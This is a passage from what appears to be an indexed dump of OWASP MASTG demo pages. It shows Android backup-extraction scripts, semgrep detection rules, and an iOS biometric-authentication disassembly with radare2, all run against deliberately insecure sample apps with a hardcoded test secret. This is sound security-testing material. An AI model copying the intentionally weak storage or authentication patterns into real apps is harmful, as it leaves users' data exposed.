&lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;full-backup-content&gt;\n    &lt;include domain=\"file\" path=\".\" requireFlags=\"clientSideEncryption\" /&gt;\n    &lt;exclude domain=\"file\" path=\"backup_excluded_secret.txt\" /&gt;\n&lt;/full-backup-content&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0020/MASTG-DEMO-0020/#steps","title":"Steps","text":"<ol> <li>Install the target app on your device.</li> <li>Open the app and exercise it to trigger file creations.</li> <li>Execute <code>run.sh</code>.</li> </ol> run.shmastg-android-backup-bmgr.sh <pre><code>#!/bin/bash\n\npackage_name=\"org.owasp.mastestapp\"\n\nadb root\nadb shell \"find /data/user/0/$package_name/files -type f\" &gt; output_before.txt\n\n../../../../utils/mastg-android-backup-bmgr.sh $package_name\n\nadb shell \"find /data/user/0/$package_name/files -type f\" &gt; output_after.txt\n\nmkdir -p restored_files\nwhile read -r line; do\n  adb pull \"$line\" ./restored_files/\ndone &lt; output_after.txt\n</code></pre> <pre><code>#!/bin/bash\n\n# Default package name\nif [ -z \"$1\" ]; then\n    echo \"No package name provided. Usage: $0 &lt;package_name&gt;\"\n    exit 1\n\nelse\n    package_name=\"$1\"\nfi\n\n# Script from https://developer.android.com/identity/data/testingbackup\n# Initialize and create a backup\nadb shell bmgr enable true\nadb shell bmgr transport com.android.localtransport/.LocalTransport | grep -q \"Selected transport\" || (echo \"Error: error selecting local transport\"; exit 1)\nadb shell settings put secure backup_local_transport_parameters 'is_encrypted=true'\nadb shell bmgr backupnow \"$package_name\" | grep -F \"Package $package_name with result: Success\" || (echo \"Backup failed\"; exit 1)\n\n# Uninstall and reinstall the app to clear the data and trigger a restore\napk_path_list=$(adb shell pm path \"$package_name\")\nOIFS=$IFS\nIFS=$'\\n'\napk_number=0\nfor apk_line in $apk_path_list\ndo\n    (( ++apk_number ))\n    apk_path=${apk_line:8:1000}\n    adb pull \"$apk_path\" \"myapk${apk_number}.apk\"\ndone\nIFS=$OIFS\nadb shell pm uninstall --user 0 \"$package_name\"\napks=$(seq -f 'myapk%.f.apk' 1 $apk_number)\nadb install-multiple -t --user 0 $apks\n\n# Clean up\nadb shell bmgr transport com.google.android.gms/.backup.BackupTransportService\nrm $apks\n\necho \"Done\"\n</code></pre> <p>For simplicity, in <code>run.sh</code> we restrict the files to the <code>filesDir</code> directory (<code>/data/user/0/org.owasp.mastestapp/files/</code> which is equivalent to <code>/data/data/org.owasp.mastestapp/files/</code>).</p> <p>The <code>run.sh</code> script does the following:</p> <ol> <li>Takes a snapshot of the app data before the backup.</li> <li>Runs the backup script, which:<ul> <li>backs up the app data.</li> <li>uninstalls the app.</li> <li>restores the app data.</li> </ul> </li> <li>Takes a snapshot of the app data after the restore.</li> <li>Retrieves the list of restored files from the device.</li> </ol>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0020/MASTG-DEMO-0020/#observation","title":"Observation","text":"<p>The output contains:</p> <ul> <li><code>output.txt</code>: the output of the <code>run.sh</code> script.</li> <li><code>output_before.txt</code>: the list of files before the backup.</li> <li><code>output_after.txt</code>: the list of files after the restore.</li> <li><code>restored_files/</code>: the directory containing the restored files.</li> </ul> output.txtoutput_before.txtoutput_after.txt <pre><code>adbd is already running as root\nBackup Manager now enabled\nPackage org.owasp.mastestapp with result: Success\n/data/app/~~Es7NACiEKrtQIzZpqtLPzw==/org.owasp.mastestapp-GvkjkmAqRCTmzufVHw8YNg==/base.apk: 1 file pulled, 0 skipped. 165.5 MB/s (25924184 bytes in 0.149s)\nSuccess\nSuccess\nSelected transport com.google.android.gms/.backup.BackupTransportService (formerly com.android.localtransport/.LocalTransport)\nDone\n/data/user/0/org.owasp.mastestapp/files/profileInstalled: 1 file pulled, 0 skipped. 0.0 MB/s (24 bytes in 0.001s)\n/data/user/0/org.owasp.mastestapp/files/secret.txt: 1 file pulled, 0 skipped. 0.0 MB/s (15 bytes in 0.001s)\n</code></pre> <pre><code>/data/user/0/org.owasp.mastestapp/files/secret.txt\n/data/user/0/org.owasp.mastestapp/files/backup_excluded_secret.txt\n/data/user/0/org.owasp.mastestapp/files/profileInstalled\n</code></pre> <pre><code>/data/user/0/org.owasp.mastestapp/files/profileInstalled\n/data/user/0/org.owasp.mastestapp/files/secret.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0020/MASTG-DEMO-0020/#evaluation","title":"Evaluation","text":"<p>The test fails because <code>secret.txt</code> is restored from the backup and it contains sensitive data.</p> restored_files/secret.txt<pre><code>secr3tPa$$W0rd\n</code></pre> <p>Note that <code>output_after.txt</code> does not contain the <code>backup_excluded_secret.txt</code> file, which is expected as it was marked as <code>exclude</code> in the <code>backup_rules.xml</code> file.</p>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0024/MASTG-DEMO-0024/","title":"MASTG-DEMO-0024: Uses of Caching UI Elements with semgrep","text":"<p>  Download MASTG-DEMO-0024 APK   Open MASTG-DEMO-0024 Folder  Build MASTG-DEMO-0024 APK</p>","tags":["android","demo","MASTG-TEST-0258"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0024/MASTG-DEMO-0024/#sample","title":"Sample","text":"<p>The code sample defines a method that creates a popup dialog for user input where 3 text input fields (<code>EditText</code>) are instantiated. For each <code>EditText</code>, the <code>inputType</code> property is set to define the type of input expected:</p> <ul> <li>password: should not be cached due to <code>TYPE_TEXT_VARIATION_PASSWORD</code></li> <li>passphrase: should be cached due to <code>TYPE_CLASS_TEXT</code></li> <li>PIN: should be cached due to <code>TYPE_CLASS_NUMBER</code>, despite initially being set to <code>TYPE_NUMBER_VARIATION_PASSWORD</code></li> </ul> <p>A dialog is also created using <code>AlertDialog.Builder</code>, and it includes \"Sign Up\" and \"Cancel\" buttons.</p>","tags":["android","demo","MASTG-TEST-0258"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0024/MASTG-DEMO-0024/#steps","title":"Steps","text":"<p>Let's run  semgrep rule against the sample code. The rule uses a pattern that captures every call to <code>setInputType</code> along with its argument.</p> ../../../../rules/mastg-android-keyboard-cache-input-types.yml<pre><code>rules:\n  - id: mastg-android-non-caching-input-types\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule scans all usages of setInputType().\n    message: \"[MASVS-STORAGE] Set input type detected ($OBJ) with $ARG\"\n    patterns:\n      - pattern: $OBJ.setInputType($ARG)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-keyboard-cache-input-types.yml ./MastgTest_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0258"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0024/MASTG-DEMO-0024/#observation","title":"Observation","text":"<p>The rule has detected several instances. For each one, the output shows:</p> <ul> <li>The line number.</li> <li>The object name in the reversed code (e.g. <code>$this$showPopup_u24lambda_u241</code> or <code>input3</code>).</li> <li>The <code>setInputType</code> method itself.</li> <li>The argument including the input type value (e.g., <code>129</code>).</li> </ul> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 4 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-keyboard-cache-input-types\n          [MASVS-STORAGE] Set input type detected ($this$showPopup_u24lambda_u241) with 129\n\n           35\u2506 $this$showPopup_u24lambda_u241.setInputType(129);\n            \u22ee\u2506----------------------------------------\n    \u276f\u2771 rules.mastg-android-keyboard-cache-input-types\n          [MASVS-STORAGE] Set input type detected ($this$showPopup_u24lambda_u242) with 1\n\n           38\u2506 $this$showPopup_u24lambda_u242.setInputType(1);\n            \u22ee\u2506----------------------------------------\n    \u276f\u2771 rules.mastg-android-keyboard-cache-input-types\n          [MASVS-STORAGE] Set input type detected (input3) with 18\n\n           41\u2506 input3.setInputType(18);\n            \u22ee\u2506----------------------------------------\n    \u276f\u2771 rules.mastg-android-keyboard-cache-input-types\n          [MASVS-STORAGE] Set input type detected (input3) with 2\n\n           42\u2506 input3.setInputType(2);\n</code></pre>","tags":["android","demo","MASTG-TEST-0258"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0024/MASTG-DEMO-0024/#evaluation","title":"Evaluation","text":"<p>The test fails because the app doesn't use non-caching input types for some sensitive fields. Only the first input field (password) is configured correctly. The other two fields (passphrase and PIN) are set to caching input types.</p> <p>See the Android InputType documentation for details about what each numeric value represents.</p> <p>(PASS) Object <code>showPopup_u24lambda_u241</code> is set as <code>129</code>:</p> <pre><code>129 &amp; 0x0000000F  #   1 (TYPE_CLASS_TEXT)\n129 &amp; 0x00000FF0  # 128 (TYPE_TEXT_VARIATION_PASSWORD)\n</code></pre> <p>This is correct because it prevents the password from being cached.</p> <p>(FAIL) Object <code>showPopup_u24lambda_u242</code> is set as <code>1</code> (<code>TYPE_CLASS_TEXT</code>).</p> <pre><code>1 &amp; 0x0000000F  #   1 (TYPE_CLASS_TEXT)\n</code></pre> <p>This is incorrect because it allows the passphrase to be cached. The correct value should be <code>129</code> (<code>TYPE_CLASS_TEXT | TYPE_TEXT_VARIATION_PASSWORD</code>).</p> <p>(FAIL) Object <code>input3</code> is first set to <code>18</code>:</p> <pre><code>18 &amp; 0x0000000F  #   2 (TYPE_CLASS_NUMBER)\n18 &amp; 0x00000FF0  #  16 (TYPE_NUMBER_VARIATION_PASSWORD)\n</code></pre> <p>This would be correct, however, in the reversed code, there's a second <code>setInputType</code> call that sets the input type to <code>2</code> (<code>TYPE_CLASS_NUMBER</code>), which is a caching input type:</p> <pre><code>2 &amp; 0x0000000F  #   2 (TYPE_CLASS_NUMBER)\n</code></pre> <p>This is incorrect because it allows the PIN to be cached. The correct value should be <code>18</code> (<code>TYPE_CLASS_NUMBER | TYPE_NUMBER_VARIATION_PASSWORD</code>).</p>","tags":["android","demo","MASTG-TEST-0258"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0034/MASTG-DEMO-0034/","title":"MASTG-DEMO-0034: Backup and Restore App Data with semgrep","text":"<p>  Download MASTG-DEMO-0034 APK   Open MASTG-DEMO-0034 Folder  Build MASTG-DEMO-0034 APK</p>","tags":["android","demo","MASTG-TEST-0262"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0034/MASTG-DEMO-0034/#sample","title":"Sample","text":"<p>This demo uses the sample from  Data Exclusion using backup_rules.xml with Backup Manager.</p> MastgTest.ktAndroidManifest.xmlbackup_rules.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val internalStorageDir = context.filesDir\n\n        val fileName = File(internalStorageDir, \"secret.txt\")\n        val fileNameOfBackupExcludedFile = File(internalStorageDir, \"backup_excluded_secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n            FileOutputStream(fileNameOfBackupExcludedFile).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteInternalStorage\", \"Error writing file to internal storage\", e)\n            return \"ERROR!!\\n\\nError writing file to internal storage\"\n        }\n\n        return \"SUCCESS!!\\n\\nFiles saved to $internalStorageDir\"\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;full-backup-content&gt;\n    &lt;include domain=\"file\" path=\".\" requireFlags=\"clientSideEncryption\" /&gt;\n    &lt;exclude domain=\"file\" path=\"backup_excluded_secret.txt\" /&gt;\n&lt;/full-backup-content&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0262"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0034/MASTG-DEMO-0034/#steps","title":"Steps","text":"<ol> <li>Read the AndroidManifest.xml and backup_rules.xml files.</li> <li>Run the semgrep script.</li> </ol> run.shmastg-android-backup-manifest.yml <pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-backup-manifest.yml ../MASTG-DEMO-0020/AndroidManifest.xml &gt; output.txt\n</code></pre> <pre><code>rules:\n  - id: mastg-android-backup-manifest-allow-backup\n    severity: WARNING\n    languages:\n      - xml\n    metadata:\n      summary: This rule inspects the AndroidManifest.xml for allowBackup.\n      references:\n        - https://developer.android.com/guide/topics/data/autobackup\n    message: \"[MASVS-STORAGE-2] allowBackup detected as $ARG.\"\n    patterns:\n      - pattern: 'android:allowBackup=\"$ARG\"'\n  - id: mastg-android-backup-manifest-backup-rules\n    severity: WARNING\n    languages:\n      - xml\n    metadata:\n      summary: This rule inspects the AndroidManifest.xml for backup rules.\n      references:\n        - https://developer.android.com/guide/topics/data/autobackup\n    message: \"[MASVS-STORAGE-2] Backup rules detected.\"\n    pattern-either:\n      - pattern: 'android:fullBackupContent=\"@xml/backup_rules\"'\n      - pattern: 'android:dataExtractionRules=\"@xml/data_extraction_rules\"'\n</code></pre>","tags":["android","demo","MASTG-TEST-0262"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0034/MASTG-DEMO-0034/#observation","title":"Observation","text":"<p>The output contains all backup-related attributes from the AndroidManifest.xml file.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    ../MASTG-DEMO-0020/AndroidManifest.xml\n    \u276f\u2771 rules.mastg-android-backup-manifest-allow-backup\n          [MASVS-STORAGE-2] allowBackup detected as true.\n\n            6\u2506 android:allowBackup=\"true\"\n\n    \u276f\u2771 rules.mastg-android-backup-manifest-backup-rules\n          [MASVS-STORAGE-2] Backup rules detected.\n\n            7\u2506 android:dataExtractionRules=\"@xml/data_extraction_rules\"\n            \u22ee\u2506----------------------------------------\n            8\u2506 android:fullBackupContent=\"@xml/backup_rules\"\n</code></pre>","tags":["android","demo","MASTG-TEST-0262"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0034/MASTG-DEMO-0034/#evaluation","title":"Evaluation","text":"<p>The test fails because the sensitive file <code>secret.txt</code> ends up in the backup. This is due to:</p> <ul> <li>The <code>android:allowBackup=\"true\"</code> attribute in the AndroidManifest.xml file.</li> <li>The <code>android:fullBackupContent=\"@xml/backup_rules\"</code> attribute is present in the AndroidManifest.xml file.</li> <li>The <code>backup_rules.xml</code> file is present in the APK and does not exclude all sensitive files.</li> </ul> ../MASTG-DEMO-0020/backup_rules.xml<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;full-backup-content&gt;\n    &lt;include domain=\"file\" path=\".\" requireFlags=\"clientSideEncryption\" /&gt;\n    &lt;exclude domain=\"file\" path=\"backup_excluded_secret.txt\" /&gt;\n&lt;/full-backup-content&gt;\n</code></pre> <p>The backup includes all files in the app's data directory except for <code>backup_excluded_secret.txt</code>.</p>","tags":["android","demo","MASTG-TEST-0262"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0035/MASTG-DEMO-0035/","title":"MASTG-DEMO-0035: Data Exclusion using backup_rules.xml with adb backup","text":"<p>  Download MASTG-DEMO-0035 APK   Open MASTG-DEMO-0035 Folder  Build MASTG-DEMO-0035 APK</p>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0035/MASTG-DEMO-0035/#sample","title":"Sample","text":"<p>This demo uses the sample from  Data Exclusion using backup_rules.xml with Backup Manager.</p> MastgTest.ktAndroidManifest.xmlbackup_rules.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.io.File\nimport java.io.FileOutputStream\nimport java.io.IOException\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        val internalStorageDir = context.filesDir\n\n        val fileName = File(internalStorageDir, \"secret.txt\")\n        val fileNameOfBackupExcludedFile = File(internalStorageDir, \"backup_excluded_secret.txt\")\n        val fileContent = \"secr3tPa\\$\\$W0rd\\n\"\n\n        try {\n            FileOutputStream(fileName).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n            FileOutputStream(fileNameOfBackupExcludedFile).use { output -&gt;\n                output.write(fileContent.toByteArray())\n                Log.d(\"WriteInternalStorage\", \"File written to internal storage successfully.\")\n            }\n        } catch (e: IOException) {\n            Log.e(\"WriteInternalStorage\", \"Error writing file to internal storage\", e)\n            return \"ERROR!!\\n\\nError writing file to internal storage\"\n        }\n\n        return \"SUCCESS!!\\n\\nFiles saved to $internalStorageDir\"\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;full-backup-content&gt;\n    &lt;include domain=\"file\" path=\".\" requireFlags=\"clientSideEncryption\" /&gt;\n    &lt;exclude domain=\"file\" path=\"backup_excluded_secret.txt\" /&gt;\n&lt;/full-backup-content&gt;\n</code></pre>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0035/MASTG-DEMO-0035/#steps","title":"Steps","text":"<ol> <li>Install the target app on your device.</li> <li>Open the app and exercise it to trigger file creations.</li> <li>Execute <code>run.sh</code>.</li> </ol> run.shmastg-android-backup-adb.sh <pre><code>#!/bin/bash\n\npackage_name=\"org.owasp.mastestapp\"\n\n../../../../utils/mastg-android-backup-adb.sh $package_name\n\nls -l1 apps/org.owasp.mastestapp/f &gt; output.txt\n\n# Cleanup\nrm backup.ab backup.tar\nfind apps/org.owasp.mastestapp/ -mindepth 1 -maxdepth 1 ! -name 'f*' -exec rm -rf {} +\n</code></pre> <pre><code>#!/bin/bash\n\n# Default package name\nif [ -z \"$1\" ]; then\n    echo \"No package name provided. Usage: $0 &lt;package_name&gt;\"\n    exit 1\n\nelse\n    package_name=\"$1\"\nfi\n\nadb backup -apk -nosystem $package_name\ntail -c +25 backup.ab | python3 -c \"import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" &gt; backup.tar\ntar xvf backup.tar\n\necho \"Done, extracted as apps/ to current directory\"\n</code></pre> <p>For simplicity, in <code>run.sh</code> we restrict the files to the <code>filesDir</code> directory in the backup structure (<code>apps/org.owasp.mastestapp/f</code>).</p>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0035/MASTG-DEMO-0035/#observation","title":"Observation","text":"<p>The output contains:</p> <ul> <li><code>output.txt</code>: the list of files from the backup.</li> <li><code>apps/org.owasp.mastestapp/f/</code>: the directory containing a copy of the backup files.</li> </ul> output.txt<pre><code>profileInstalled\nsecret.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0035/MASTG-DEMO-0035/#evaluation","title":"Evaluation","text":"<p>The test fails because <code>secret.txt</code> is part of the backup and it contains sensitive data.</p> apps/org.owasp.mastestapp/f/secret.txt<pre><code>secr3tPa$$W0rd\n</code></pre> <p>Note that <code>backup_excluded_secret.txt</code> file is not part of the backup, which is expected as it was marked as <code>exclude</code> in the <code>backup_rules.xml</code> file.</p>","tags":["android","demo","MASTG-TEST-0216"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0060/MASTG-DEMO-0060/","title":"MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences","text":"<p>Placeholder MASTG-DEMO</p> <p>This demo hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that demo by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-DEMO-0060</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","demo","placeholder","MASTG-TEST-0287"]},{"location":"MASTG/demos/android/MASVS-STORAGE/MASTG-DEMO-0060/MASTG-DEMO-0060/#draft-description","title":"Draft Description","text":"<p>This demo shows how to store sensitive data securely in the app sandbox using the EncryptedSharedPreferences class.</p> <p>For more details, check the associated test:  Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox</p>","tags":["android","demo","placeholder","MASTG-TEST-0287"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/","title":"MASTG-DEMO-0041: Uses of LAContext.evaluatePolicy with r2","text":"<p>  Download MASTG-DEMO-0041 IPA   Open MASTG-DEMO-0041 Folder  Build MASTG-DEMO-0041 IPA</p>","tags":["ios","demo","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/#sample","title":"Sample","text":"<p>The following sample insecurely accesses sensitive resources, a secret token, relying solely on the LocalAuthentication API for access control instead of using the Keychain API and requiring user presence. It does so by using the <code>evaluatePolicy</code> method of the <code>LAContext</code> class to authenticate the user with biometrics (<code>deviceOwnerAuthenticationWithBiometrics</code>).</p> <p>This method is weak because it depends on an if statement to check if the authentication was successful, which can be bypassed by an attacker using techniques such as  Bypassing Biometric Authentication.</p> MastgTest.swift<pre><code>import Foundation\nimport LocalAuthentication\n\nstruct MastgTest {\n\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let token = \"8767086b9f6f976g-a8df76\"\n        let context = LAContext()\n        let reason = \"Authenticate to access your token\"\n\n        context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: reason) { success, error in\n            DispatchQueue.main.async {\n                if success {\n                    completion(\"\u2705 Retrieved token: \\(token)\")\n                    return\n                }\n\n                // Authentication failed: inspect the error code\n                let message: String\n                if let laError = error as? LAError {\n                    switch laError.code {\n                    case .userCancel:\n                        message = \"Authentication was cancelled by the user.\"\n                    case .userFallback:\n                        message = \"User tapped the fallback button (e.g. entered a password).\"\n                    case .systemCancel:\n                        message = \"Authentication was cancelled by the system (e.g. another app came to foreground).\"\n                    case .passcodeNotSet:\n                        message = \"Passcode is not set on the device.\"\n                    case .biometryNotAvailable:\n                        message = \"No biometric authentication is available on this device.\"\n                    case .biometryNotEnrolled:\n                        message = \"The user has not enrolled any biometrics.\"\n                    case .biometryLockout:\n                        message = \"Biometry is locked out due to too many failed attempts.\"\n                    default:\n                        // For any future or undocumented codes\n                        message = laError.localizedDescription\n                    }\n                } else {\n                    // Some other non\u2010LAError error\n                    message = error?.localizedDescription ?? \"Unknown authentication error.\"\n                }\n\n                completion(\"\u274c \\(message)\")\n            }\n        }\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run <code>run.sh</code>.</li> </ol> insecureAuthenticationBiometricsApi.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Print xrefs to \\'Run analysis\\\"\naaa\n\n?e Print xrefs to \\'evaluatePolicy\\\"\nf~evaluatePolicy\n\n?e\n\n?e Print xrefs to 0x100010098\naxt @ 0x100010098\n\n?e\n\n?e Print disassembly around \\\"evaluatePolicy\\\" in the function\npdf @ 0x100004344 | grep -C 5 \"evaluatePolicy:\"\n\n?e Print xrefs to \\'SecAccessControlCreateWithFlags\\\"\nf~SecAccessControlCreateWithFlags\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i insecureAuthenticationBiometricsApi.r2 -e emu.str=true -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/#observation","title":"Observation","text":"output.asm<pre><code>Print xrefs to 'Run analysis\"\nPrint xrefs to 'evaluatePolicy\"\n0x100008297 38 str.evaluatePolicy:localizedReason:reply:\n0x100010098 8 reloc.fixup.evaluatePolicy:localizedReason:\n\nPrint xrefs to 0x100010098\nsym.MASTestApp.MastgTest.mastg.completion.nd_n 0x100004344 [DATA:r--] ldr x1, [x8, 0x98]\n\nPrint disassembly around \"evaluatePolicy\" in the function\n\u2502           0x100004334      bl sym.imp.swift_retain\n\u2502           0x100004338      mov x0, x23                               ; void *arg0\n\u2502           0x10000433c      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502                                                                      ; void swift_release(0)\n\u2502           0x100004340      adrp x8, sym.__METACLASS_DATA__TtC10MASTestAppP33_9471609302C95FC8EC1D59DD4CF2A2DB19ResourceBundleClass ; 0x100010000\n\u2502           0x100004344      ldr x1, [x8, 0x98]                        ; [0x100010098:4]=0x8297 ; reloc.fixup.evaluatePolicy:localizedReason: ; char *selector\n\u2502           0x100004348      mov x0, x19                               ; void *instance\n\u2502           0x10000434c      mov w2, 1\n\u2502           0x100004350      mov x3, x20\n\u2502           0x100004354      mov x4, x22\n\u2502           0x100004358      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\nPrint xrefs to 'SecAccessControlCreateWithFlags\"\n</code></pre> <p>The output reveals the use of <code>LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: ...)</code> in the app. However, it doesn't look exactly the same as in <code>MastgTest.swift</code> because the compiler transforms some functions into Objective-C counterparts. An equivalent Objective-C representation in the binary looks like <code>objc_msgSend(void *address, \"evaluatePolicy:localizedReason:\", LAPolicyDeviceOwnerAuthenticationWithBiometrics, ...)</code>. By looking at the output we can find this pattern at lines 15-20.</p> <p>The third argument of <code>objc_msgSend(...)</code> is <code>LAPolicyDeviceOwnerAuthenticationWithBiometrics</code> because <code>w2</code> register at the time of the function invocation is set to <code>1</code> with a <code>mov</code> instruction at Line 17. <code>1</code> is an enum representation of <code>LAPolicyDeviceOwnerAuthenticationWithBiometrics</code>.</p> <p>You can find all the possible values defined in LAPublicDefines.h by running (requires  Xcode):</p> <pre><code>grep kLAPolicyDeviceOwnerAuthentication 